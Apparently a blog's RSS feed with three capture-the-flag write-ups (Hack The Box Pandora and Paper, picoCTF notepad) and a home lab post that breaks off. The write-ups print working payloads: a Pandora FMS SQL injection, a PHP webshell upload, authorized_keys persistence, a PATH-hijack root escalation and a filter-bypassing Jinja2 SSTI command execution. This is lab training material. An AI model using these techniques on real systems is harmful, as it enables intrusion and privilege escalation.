@@ -1,0 +1,965 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Logan MacLaren</title><link>https://maclarel.github.io/posts/</link><description>Recent content in Posts on Logan MacLaren</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Mon, 04 Apr 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://maclarel.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Hack The Box - Pandora</title><link>https://maclarel.github.io/posts/2022-04/htb_pandora/</link><pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2022-04/htb_pandora/</guid><description>Premise Second verse same as the first - we&amp;rsquo;re given an IP and no further information. Commence enumeration!
+Enumeration To set the stage, enumeration is probably the hardest part of this challenge. The rest is doable with some patience and research.
+Out of the gate we have a website talking about some random product. There&amp;rsquo;s nothing interactable, and nmap only gives us TCP 22 and 80 as open ports.
+Fuzzing with ffuf and nikto turns up nothing actionable, just icons and asset directories, neither of which can be used for anything.</description><content type="html"><![CDATA[<h1 id="premise">Premise</h1>
+<p>Second verse same as the first - we&rsquo;re given an IP and no further information. Commence enumeration!</p>
+<h1 id="enumeration">Enumeration</h1>
+<p>To set the stage, enumeration is probably the hardest part of this challenge. The rest is doable with some patience and research.</p>
+<p>Out of the gate we have a website talking about some random product. There&rsquo;s nothing interactable, and <code>nmap</code> only gives us TCP 22 and 80 as open ports.</p>
+<p>Fuzzing with <code>ffuf</code> and <code>nikto</code> turns up nothing actionable, just <code>icons</code> and <code>asset</code> directories, neither of which can be used for anything.</p>
+<p>This is where I got stuck a bit initially, trying to fingerprint the web server further, find alternate hostnames for name-based virtual hosts, etc&hellip;but there&rsquo;s nothing, at least out of the gate.</p>
+<p>From here, I decided to run a rather painstaking UDP scan with <code>nmap</code>, which turned up UDP 161:</p>
+<pre><code>Discovered open port 161/udp on 10.10.11.136 
+</code></pre><p>This wound up being SNMP v1, so we can try running <code>snmpwalk</code> against it. Not being overly familiar with this tool, I just took the default examples and ran against it to experiment- <code>snmpwalk -oS -c public -v 1 panda.htb</code>. Among other information, if you watch long enough (I mentioned patience&hellip;) this will pop up with:</p>
+<pre><code>iso.3.6.1.2.1.25.4.2.1.5.843 = STRING: &quot;-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23
+</code></pre><p>These credentials couldn&rsquo;t possibly work over SSH, could they? They do.</p>
+<p>Unfortunately, our flag is not in the home dir of the user in question, but is unreadable in <code>/home/matt/</code>. On to other enumeration!</p>
+<h1 id="foothold-but-no-real-traction">Foothold, but no real traction</h1>
+<p>At this point we&rsquo;re on the box, we&rsquo;ve got reliable access over <code>ssh</code>, but we can&rsquo;t really do anything as the <code>daniel</code> user has little to no permissions.</p>
+<p>We know we&rsquo;ve got an Apache server running, so let&rsquo;s see what else is running. Maybe there&rsquo;s another site that we couldn&rsquo;t enumerate earlier. As it turns out, there is another directory under <code>/var/www</code> - <code>pandoraconsole</code> but we can&rsquo;t hit it remotely. Looking at <code>/etc/apache/sites-enabled/pandora.conf</code> we can see that it&rsquo;s  <em>only</em> listens on <code>localhost</code> which is part of the reason we couldn&rsquo;t fuzz for it - and that it runs as <code>matt</code>, the user who has our first flag.</p>
+<h1 id="opening-a-pandoras-box">Opening a Pandora&rsquo;s Box</h1>
+<p>Since this will only respond on <code>localhost</code>, we&rsquo;ll need to proxy access. There are a few ways to do this, but SSH port forwarding is probably the easiest by far:</p>
+<pre><code>ssh -L 80:localhost:80 panda.htb
+</code></pre><p>Yep! We have a console. Maybe the same creds? Maybe, but says user can only use the API. Main site links us to docs that cover the API, but long story short there&rsquo;s no direct compromise available there - this is a deep rabbit hole.</p>
+<p>What we do know at this point is that we&rsquo;ve got another possible attack surace - Pandora FMS v7.0NG.742_FIX_PERL2020, and some quick research turns up a few vulnerabilities - <a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained">https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained</a>.</p>
+<p>Following up with <a href="https://github.com/ibnuuby/CVE-2021-32099,">https://github.com/ibnuuby/CVE-2021-32099,</a> we can run the example request and all of a sudden we have an active session as an admin.</p>
+<pre><code>http://localhost:80/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario%7Cs:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
+</code></pre><p>At this point we&rsquo;ve got admin level access to this product, which must be an avenue for further compromise, but there&rsquo;s nothing immiediately obvious.</p>
+<h1 id="can-we-put-things-in-the-box">Can we put things in the box?</h1>
+<p>As it turns out, the one thing we <em>can</em> do in this product is perform arbitrary file uploads.</p>
+<p>While the paths for these get hashed in so far as how they&rsquo;re returned in the file upload API, poking around the UI we can see some overlap between the images used to populate parts of the UI, logos, etc&hellip; and the contents of the directories that we&rsquo;re able to upload to. This means we&rsquo;ve likely got a predictable path for where our uploaded files will land.</p>
+<p>While this doesn&rsquo;t let us do anything fun like SVG vulnerabilities, it does let us do something even more silly&hellip; upload a <a href="https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985">PHP webshell</a>.</p>
+<p>Were our theories about predictable paths correct? Yep! http://localhost/pandora_console/images/webshell.php - and it looks like we&rsquo;re running as <code>matt</code>. Let&rsquo;s get the user flag!</p>
+<pre><code>cat /home/matt/user.txt
+b7989...
+</code></pre><h1 id="getting-root">Getting root</h1>
+<p>Let&rsquo;s try to get a shell as <code>matt</code> by copying our public key into <code>authorized_keys</code> through the webshell.</p>
+<pre><code>echo &lt;key&gt; &gt;&gt; /home/matt/.ssh/authorized_keys
+</code></pre><pre><code>➜  ssh matt@panda.htb                                   
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon  4 Apr 16:38:43 UTC 2022
+
+  System load:  0.02              Processes:             234
+  Usage of /:   63.2% of 4.87GB   Users logged in:       1
+  Memory usage: 9%                IPv4 address for eth0: 10.10.11.136
+  Swap usage:   0%
+
+  =&gt; /boot is using 91.8% of 219MB
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+matt@pandora:~$ 
+
+</code></pre><p>We are in!</p>
+<p>The current run of the mill stuff like polkit vulnerabilities appear to have been patched, so no luck there, and we don&rsquo;t have any <code>sudo</code> privs. Nothing obvious gained here other than the user flag.</p>
+<p>At this point I decided to take a step back and run <a href="https://github.com/DominicBreuker/pspy">pspy</a> for a few hours to see if anything interesting came up. While this gave me a few leads, there was nothing that was jumping out at me or lead to anything other than rabbit holes.</p>
+<p>After letting <code>pspy</code> again run for a bit longer in the background and getting nowhere I decided to check for something simple - we we have any <code>setuid</code> flagged scripts/binaries that we could abuse?</p>
+<pre><code>matt@pandora:/dev/shm$ find / -perm -4000 2&gt;/dev/null
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/pandora_backup
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/at
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+</code></pre><p><code>pandora_backup</code> looks like a plant&hellip; what is it and can we use it?</p>
+<pre><code>matt@pandora:/dev/shm$ ll /usr/bin/pandora_backup 
+-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup*
+</code></pre><p>It&rsquo;s either a plant, or its our target. I&rsquo;m guessing the later. It&rsquo;s a binary though, so let&rsquo;s see what&rsquo;s in it&hellip; hopefully there are some plain text strings:</p>
+<pre><code>PandoraFMS Backup Utility^@^@^@^@^@^@^@Now attempting to backup PandoraFMS client^@^@^@^@^@^@tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*^@Backup failed!
+</code></pre><p>Ok, we can run with this&hellip; so it&rsquo;s trying to create a tar file, and it&rsquo;s not specifying the path to the executable. Can we abuse this with a <code>PATH</code> update?</p>
+<pre><code>tar: Removing leading `/' from hard link targets
+/var/www/pandora/pandora_console/COPYING
+/var/www/pandora/pandora_console/DB_Dockerfile
+</code></pre><p>It&rsquo;s definitely running <code>tar</code>. Let&rsquo;s update PATH with a malicious <code>tar</code> executable that&rsquo;s going to spawn a shell. Since this process runs as <code>root</code>, we should be able to get a <code>root</code> shell, right?</p>
+<pre><code>matt@pandora:/dev/shm$ echo &quot;/bin/bash&quot; &gt; tar
+matt@pandora:/dev/shm$ chmod +x tar 
+matt@pandora:/dev/shm$ PATH=/dev/shm:$PATH
+matt@pandora:/dev/shm$ echo $PATH
+/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+</code></pre><p>Running <code>tar</code> as <code>matt</code> now gives us a new shell (as <code>matt</code>). Does this carry over into <code>pandora_backup</code>?</p>
+<p>YES!</p>
+<pre><code>matt@pandora:/dev/shm$ /usr/bin/pandora_backup
+PandoraFMS Backup Utility
+Now attempting to backup PandoraFMS client
+root@pandora:/dev/shm# whoami
+root
+root@pandora:/dev/shm# cat /root/root.txt 
+18dd17ce1...
+</code></pre><p>Time to clean up and get out! GG!</p>
+]]></content></item><item><title>Hack The Box - Paper</title><link>https://maclarel.github.io/posts/2022-04/htb_paper/</link><pubDate>Fri, 01 Apr 2022 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2022-04/htb_paper/</guid><description>Premise As with all Hack The Box (HTB) Machines we&amp;rsquo;re given nothing more than an IP.
+Initial target enumeration with nmap shows us TCP 22, 80, and 443 open, with SSH and Apache 2.4.37 respectively. The TLS information returned isn&amp;rsquo;t super helpful, and hitting the website gives us nothing more than the default CentOS Apache httpd page.
+Further exploration Next step, after a lot of poking, prodding, fuzzing, etc&amp;hellip; and getting nowhere was to try out nikto to see if there&amp;rsquo;s anything else the webserver might be leaking for us.</description><content type="html"><![CDATA[<h1 id="premise">Premise</h1>
+<p>As with all Hack The Box (HTB) <code>Machines</code> we&rsquo;re given nothing more than an IP.</p>
+<p>Initial target enumeration with <code>nmap</code> shows us TCP 22, 80, and 443 open, with SSH and Apache 2.4.37 respectively. The TLS information returned isn&rsquo;t super helpful, and hitting the website gives us nothing more than the default CentOS Apache httpd page.</p>
+<h1 id="further-exploration">Further exploration</h1>
+<p>Next step, after a lot of poking, prodding, fuzzing, etc&hellip; and getting nowhere was to try out <code>nikto</code> to see if there&rsquo;s anything else the webserver might be leaking for us.</p>
+<p>Fortunately there is - a potential host name of <code>office.paper</code> thanks to a <code>x-backend-server</code> header. Presumably this is for name-based virtual hosts with Apache, so let&rsquo;s add it to <code>/etc/hosts</code> with the target IP and see what we get.</p>
+<p>Bingo. A wordpress blog.</p>
+<h1 id="wordpress-moar-like-insecurepress-m-i-rite">wordpress? moar like insecurepress, m i rite?</h1>
+<p>Joking aside, this is running an <em>ancient</em> version of Wordpress from back in 2019. This will become useful shortly.</p>
+<p>From initial poking around there&rsquo;s no much of interest, other than the singular response to any of the blog posts there, and it&rsquo;s chastising the author for leaving sensitive data in drafts. Hmmm&hellip; Is there a way we can access those?</p>
+<p><a href="https://www.exploit-db.com/exploits/47690">Yes, there is.</a>.</p>
+<p>With this knowledge, we can just hit <a href="http://office.paper/?status=1">http://office.paper/?status=1</a> and right away we&rsquo;ve got the information we need to move to our next step - RocketChat.</p>
+<h1 id="i-for-one-welcome-our-robot-overlords">I, for one, welcome our robot overlords</h1>
+<p>After using the signup link from the draft, and getting access to RocketChat, there&rsquo;s some juicy info there about a chat bot that can be used to do various business things&hellip; but also, for some insane reason, to list files and get their contents. Ripe for exploitation.</p>
+<p>We can get directory listings with <code>recyclops list sale</code> as the example, but as it turns out this also allows for relative paths.</p>
+<pre><code>4:55 PM
+recyclops list sale/../..
+Bot
+4:55 PM
+Fetching the directory listing of sale
+total 4
+drwxr-xr-x 2 dwight dwight 27 Sep 15 2021 .
+drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 ..
+-rw-r--r-- 1 dwight dwight 158 Sep 15 2021 portfolio.txt
+Fetching the directory listing of sale/..
+total 0
+drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 .
+drwx------ 12 dwight dwight 323 Apr 1 16:26 ..
+drwxr-xr-x 2 dwight dwight 27 Sep 15 2021 sale
+drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2
+Fetching the directory listing of sale/../..
+total 64
+drwx------ 12 dwight dwight 323 Apr 1 16:26 .
+drwxr-xr-x. 3 root root 20 Jan 14 06:50 ..
+lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout
+-rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile
+-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc
+-rwxr-xr-x 1 dwight dwight 1174 Sep 16 2021 bot_restart.sh
+drwx------ 5 dwight dwight 56 Jul 3 2021 .config
+-rw------- 1 dwight dwight 9 Apr 1 16:26 .dbshell
+-rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth
+drwx------ 3 dwight dwight 69 Apr 1 16:26 .gnupg
+drwx------ 8 dwight dwight 4096 Sep 16 2021 hubot
+-rw-rw-r-- 1 dwight dwight 18 Sep 16 2021 .hubot_history
+-rwxrwxr-x 1 dwight dwight 25152 Apr 1 14:22 jeTNike
+drwx------ 3 dwight dwight 19 Jul 3 2021 .local
+drwxrwxr-x 2 dwight dwight 27 Apr 1 14:22 lol
+drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla
+drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm
+drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales
+drwx------ 2 dwight dwight 29 Apr 1 16:07 .ssh
+-r-------- 1 dwight dwight 33 Apr 1 14:12 user.txt
+drwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vim
+</code></pre><p>There&rsquo;s the user flag, let&rsquo;s see if we can get it.</p>
+<pre><code>4:56 PM
+recyclops file sale/../../user.txt
+Bot
+4:56 PM
+Access denied. 
+</code></pre><p>Nope! Let&rsquo;s see what else is there.</p>
+<p>I see a <code>bot_restart.sh</code> script. Let&rsquo;s check it with <code>recyclops file sale/../../bot_restart.sh</code></p>
+<pre><code> &lt;!=====Contents of file sale/../../bot_restart.sh=====&gt;
+#!/bin/bash
+
+# Cleaning hubot's log so that it won't grow too large.
+echo &quot;&quot; &gt; /home/dwight/hubot/.hubot.log
+
+
+# For starting the bot 20-ish (10+20) seconds late, when the server is restarted.
+# This is because MongoDB and Rocket-Chat server needs some time to startup properly
+sleep 10s
+
+# Checks if Hubot is running every 10s
+while [ 1 ];
+do
+sleep 20s
+alive=$(/usr/sbin/ss -tulnp|grep 8000);
+if [[ -n $alive ]]; then
+err=$(grep -i 'unhandled-rejections=strict' /home/dwight/hubot/.hubot.log)
+if [[ -n $err ]]; then
+# Restarts bot
+echo &quot;[-] Bot not running!
+date&quot;;
+#Killing the old process
+pid=$(ps aux|grep -i 'hubot -a rocketchat'|grep -v grep|cut -d &quot; &quot; -f6);
+kill -9 $pid;
+cd /home/dwight/hubot;
+# Cleaning hubot's log so that it won't grow too large.
+echo &quot;&quot; &gt; /home/dwight/hubot/.hubot.log
+bash /home/dwight/hubot/start_bot.sh&amp;
+else
+
+
+echo &quot;[+] Bot running succesfully! date&quot;;
+fi
+
+else
+# Restarts bot
+echo &quot;[-] Bot not running! date
+&quot;;
+#Killing the old process
+pid=$(ps aux|grep -i 'hubot -a rocketchat'|grep -v grep|cut -d &quot; &quot; -f6);
+kill -9 $pid;
+cd /home/dwight/hubot;
+bash /home/dwight/hubot/start_bot.sh&amp;
+fi
+
+done
+&lt;!=====End of file sale/../../bot_restart.sh=====&gt;
+</code></pre><p>Ok, looks like the bot stuff is all under <code>/home/dwight/hubot</code>, let&rsquo;s see what it can do.</p>
+<p>We can see what scripts it can run with <code>recyclops list ../hubot/scripts/</code> which shows us a <code>cmd.coffee</code>.</p>
+<pre><code> &lt;!=====Contents of file ../hubot/scripts/cmd.coffee=====&gt;
+# Description:
+# Runs a command on hubot
+# TOTAL VIOLATION of any and all security!
+#
+# Commands:
+# hubot cmd &lt;command&gt; - runs a command on hubot host
+
+module.exports = (robot) -&gt;
+robot.respond /CMD (.*)$/i, (msg) -&gt;
+# console.log(msg)
+@exec = require('child_process').exec
+cmd = msg.match[1]
+msg.send &quot;Running [#{cmd}]...&quot;
+
+@exec cmd, (error, stdout, stderr) -&gt;
+if error
+msg.send error
+msg.send stderr
+else
+msg.send stdout
+# Description:
+# Runs a command on hubot
+# TOTAL VIOLATION of any and all security!
+#
+# Commands:
+# hubot cmd &lt;command&gt; - runs a command on hubot host
+
+module.exports = (robot) -&gt;
+robot.respond /CMD (.*)$/i, (msg) -&gt;
+# console.log(msg)
+@exec = require('child_process').exec
+cmd = msg.match[1]
+msg.send &quot;Running [#{cmd}]...&quot;
+
+@exec cmd, (error, stdout, stderr) -&gt;
+if error
+msg.send error
+msg.send stderr
+else
+msg.send stdout
+&lt;!=====End of file ../hubot/scripts/cmd.coffee=====&gt;
+</code></pre><p>What does it do? Exactly what you think&hellip; RCE, but at least it&rsquo;s scoped to a non-root user.</p>
+<pre><code>5:02 PM
+recyclops cmd whoami
+Bot
+5:02 PM
+Running [whoami]...
+Running [whoami]...
+dwight
+dwight
+</code></pre><p>We can use this to get the <code>user.txt</code> flag as a starting point with <code>recyclops cmd cat /home/dwight/user.txt</code>:</p>
+<pre><code> Running [cat /home/dwight/user.txt]...
+c1ff88de...
+</code></pre><h1 id="foothold--root">Foothold &amp; <code>root</code></h1>
+<p>We can add our own public key into <code>dwight</code>&rsquo;s authorized keys with this and use that as a starting point:</p>
+<pre><code>recyclops cmd echo ssh-rsa &lt;key goes here&gt; &gt;&gt; /home/dwight/.ssh/authorized_keys
+</code></pre><p>And we&rsquo;re in with a stable shell.</p>
+<pre><code>[dwight@paper ~]$
+</code></pre><p><em>Note</em>: Another approach here could be use <code>recyclops</code> to spawn a reverse shell. While that <em>might</em> be better for not leaving fingerprints (literally our SSH public key), it means we have to deal with getting a stable shell from there. This is easier, and for a CTF I&rsquo;ll take that tradeoff.</p>
+<p>Now that we&rsquo;re in, we can see that <code>dwight</code> has no <code>sudo</code> privs - prompting for a password just to run <code>sudo -l</code>, so that&rsquo;s a no go.</p>
+<p>Let&rsquo;s just go for the gold <a href="https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py">with <code>polkit</code> sploitz</a> and see if it works.</p>
+<p>Yep.</p>
+<pre><code>[root@paper shm]#
+[root@paper shm]# cat /root/root.txt
+7402782...
+</code></pre><p>Time to clean up and get out - delete the <code>authorized_keys</code> entry, delete the <code>polkit</code> exploit script, and clear history.</p>
+<p>GG!</p>
+]]></content></item><item><title>picoCTF - notepad</title><link>https://maclarel.github.io/posts/2022-03/pico_notepad/</link><pubDate>Sat, 26 Mar 2022 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2022-03/pico_notepad/</guid><description>Premise We&amp;rsquo;re given a service that will take abitrary input, and render it as an HTML page.
+There are a few restrictions:
+Content cannot be longer than 512 characters Content cannot include _ or / characters Lastly, from the Dockerfile we know that the flag is going to have an arbtirary name starting with flag-.
+Examining the tarball This challenge comes with a tarball that contains the source code so we can do some white box analysis of how all of this works.</description><content type="html"><![CDATA[<h1 id="premise">Premise</h1>
+<p>We&rsquo;re given a service that will take abitrary input, and render it as an HTML page.</p>
+<p>There are a few restrictions:</p>
+<ul>
+<li>Content cannot be longer than 512 characters</li>
+<li>Content cannot include <code>_</code> or <code>/</code> characters</li>
+</ul>
+<p>Lastly, from the <code>Dockerfile</code> we know that the flag is going to have an arbtirary name <em>starting with</em> <code>flag-</code>.</p>
+<h1 id="examining-the-tarball">Examining the tarball</h1>
+<p>This challenge comes with a tarball that contains the source code so we can do some white box analysis of how all of this works.</p>
+<p>At a high level, we can see that this is a Flask app (SSTI&hellip;?), and that we&rsquo;ve got a flag, and <code>static</code> and <code>templates/errors</code> directories.</p>
+<p>From <code>app.py</code>, we can see how some of the application logic is enforced:</p>
+<pre><code>def create():
+    content = request.form.get(&quot;content&quot;, &quot;&quot;)
+    if &quot;_&quot; in content or &quot;/&quot; in content:
+        return redirect(url_for(&quot;index&quot;, error=&quot;bad_content&quot;))
+    if len(content) &gt; 512:
+        return redirect(url_for(&quot;index&quot;, error=&quot;long_content&quot;, len=len(content)))
+    name = f&quot;static/{url_fix(content[:128])}-{token_urlsafe(8)}.html&quot;
+    with open(name, &quot;w&quot;) as f:
+        f.write(content)
+    return redirect(name)
+</code></pre><p>We&rsquo;re taking arbitrary input from the form in <code>index.html</code>, checking if it contains <code>_</code> or <code>/</code> (throw a <code>bad_content</code> error if so), then checking if it is &gt; 512 charactersx in length (throw a <code>long_content</code> error if so.</p>
+<p>From there, a name for the resultant file is generated using the <em>first 128 characters of the content</em> (!!), and then an arbitrary random suffix to avoid collisions.</p>
+<p>Lastly, the file is written out, and the user is redirected to it.</p>
+<h1 id="where-do-we-start">Where do we start?</h1>
+<p>First off, since we&rsquo;re generating a filename using only the first 128 characters, we can use that as padding, e.g. content of <code>12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678foobarbaz</code> will give us a file name of <code>12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-pGVBCkNvTLY.html</code>. For whatever we want to include so that it won&rsquo;t break the URL (e.g. if we wanted to use iframes to try to retrieve other content, relative pages, etc&hellip;). This may or may not be useful, but at face value cannot be used to retrieve content outside of the <code>static</code> dir.</p>
+<p>If we try to do something simple like creating a new file outside of the <code>static</code> subdir, we&rsquo;ll just get a 500 error. For example, submitting content of <code>..\templates\foo.html</code> just results in <code>Internal Server Error</code> and no file creation. Similarly, attempts at LFI outside of the scope of the <code>static</code> dir through <code>iframes</code> will 404.</p>
+<p>The attack surface as far as I can see it at this point is to try to do something like add a new error page, or overwrite the existing error pages (this should be possible due to how the file is being opened, <code>w</code>), with content that will allow us to gain further access.</p>
+<h1 id="what-does-traffic-look-like">What does traffic look like?</h1>
+<p>If we proxy traffic through Burp (or anything similar), we&rsquo;re just doing a basic POST with a <code>content</code> parameter:</p>
+<pre><code>POST /new HTTP/1.1
+Host: localhost:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 14
+Origin: http://localhost:8000
+Connection: close
+Referer: http://localhost:8000/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+
+content=foobar
+</code></pre><p>Good news is this is easy enough for us to play with in Repeater &amp; Intruder if we wanted to, but in retrospect it won&rsquo;t save much time.</p>
+<h1 id="error-templates">Error templates</h1>
+<p>Another factor here is that looking at the error templates, these are included <em>based on a URL parameter</em>, so again, if we can create a new template, it&rsquo;s trivial for us to call it.</p>
+<p>For example, running the docker container, if we write out an arbitrary <code>templates/errors/foo.html</code> file that contains whatever we want, we can just call it from <code>http://localhost:8000/?error=foo</code>.</p>
+<p>But how do we do this&hellip;?</p>
+<p>The first lead is that the application is using <code>url_fix</code>, which is going to change <code>\</code> characters to <code>/</code> for us, so that part of the content filtering is irrelevant. If we try a payload of <code>..\templates\errors\</code> we get some curious behaviour&hellip; the returned URL is <code>http://localhost:8000/templates/errors/-AkAtr82ZpXU.html</code>, and if we look at the local filesystem:</p>
+<pre><code>root@bb0be7618f85:/app# ls templates/errors/
+-AkAtr82ZpXU.html  bad_content.html  long_content.html
+</code></pre><p>We have a way to create arbitrary files! We also know that we can manage the creation of the filename, and that content beyond the 128th character (but under 512) is entirely under our control.</p>
+<p>Let&rsquo;s try a payload of:</p>
+<pre><code>..\templates\errors\12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678
+
+foobarbaz
+</code></pre><p>Predictably, this will 404, but we get a returned URL of <code>http://localhost:8000/templates/errors/123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-ZyKmdETiOlI.html</code>. Since we know this file <em>will</em> exist on the file system, we can also now try calling it as an error since we know the filename in whole by hitting <code>http://localhost:8000/?error=123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-ZyKmdETiOlI</code>.</p>
+<p>Sure enough, the full content is returned in the page content!</p>
+<pre><code> error: 123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-ZyKmdETiOlI
+..\templates\errors\12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 foobarbaz
+make a new note
+...
+</code></pre><h1 id="ssti">SSTI?</h1>
+<p>We&rsquo;ve got the ability to create arbitrary files, with content we <em>largely</em> control. Let&rsquo;s explore this further and see what vulnerabilities there are. To start, let&rsquo;s try a typical <code>{{ 7 * 7 }}</code> payload after our padding.</p>
+<p>The rendered content?</p>
+<pre><code>..\templates\errors\12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 49 
+</code></pre><p>Note that 49! Woohoo! Alright, we know we can&rsquo;t include <code>_</code> characters in the content, but can we encode this in a different way? Perhaps a hex <code>\x5f</code>? Yes!</p>
+<pre><code>{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}}
+</code></pre><p>Sure enough, this also includes <code>&lt;class 'subprocess.Popen'&gt;</code> (position 273 in my case), so we&rsquo;re in business.</p>
+<h1 id="time-for-rce">Time for RCE!</h1>
+<p>With the hex form of <code>_</code> unfiltered, and access to <code>subprocess.Popen</code> we can use the following payload to proce out RCE:</p>
+<pre><code>..\templates\errors\123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 {{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(273)('ls',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}
+</code></pre><p>Pass the resulting error page filename (minus URL) into <code>localhost:8000/?error=&lt;namehere&gt;</code>, and we get:</p>
+<pre><code> error: 123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-gt_Z1Bro-iE
+..\templates\errors\123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 app.py flag-bae52e25-3397-45de-8f53-f9e9a1d6a416.txt static templates 
+</code></pre><p>And with one final tweak to run <code>cat flag*</code> instead of <code>ls</code>:</p>
+<pre><code> error: 123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-WRn7y2p0oMg
+..\templates\errors\123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 foobarbaz 
+</code></pre><pre><code>root@bb0be7618f85:/app# cat flag-bae52e25-3397-45de-8f53-f9e9a1d6a416.txt 
+foobarbaz
+</code></pre><p>I&rsquo;ll leave you to get the flag for yourself on the live system ;)</p>
+<p>Helpful reference:</p>
+<ul>
+<li><a href="https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f">Jinja2 SSTI filter bypasses</a></li>
+</ul>
+]]></content></item><item><title>Home lab updates v2</title><link>https://maclarel.github.io/posts/2021-11/home_lab_updates/</link><pubDate>Tue, 23 Nov 2021 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2021-11/home_lab_updates/</guid><description>Looks like the last time I posted any updates about my home lab setup was back in April of 2020, so I guess we&amp;rsquo;re do for an update!
+What has changed? Server rebuild New (2nd hand) 24 port gigabit switch 900W UPS Synology DS918 NAS So what am I doing with all these toys? The server rebuild is probably one of the bigger things here. While I was already hosting VMs and Docker containers on this box when it was running Windows, it was unreliable at best thanks to forced updates/reboots in Windows 10.</description><content type="html"><![CDATA[<p>Looks like the last time I posted any updates about my home lab setup was back in April of 2020, so I guess we&rsquo;re do for an update!</p>
+<h1 id="what-has-changed">What has changed?</h1>
+<ul>
+<li><a href="../../2021-05/server_rebuild/">Server rebuild</a></li>
+<li>New (2nd hand) 24 port gigabit switch</li>
+<li>900W UPS</li>
+<li>Synology DS918 NAS</li>
+</ul>
+<h1 id="so-what-am-i-doing-with-all-these-toys">So what am I doing with all these toys?</h1>
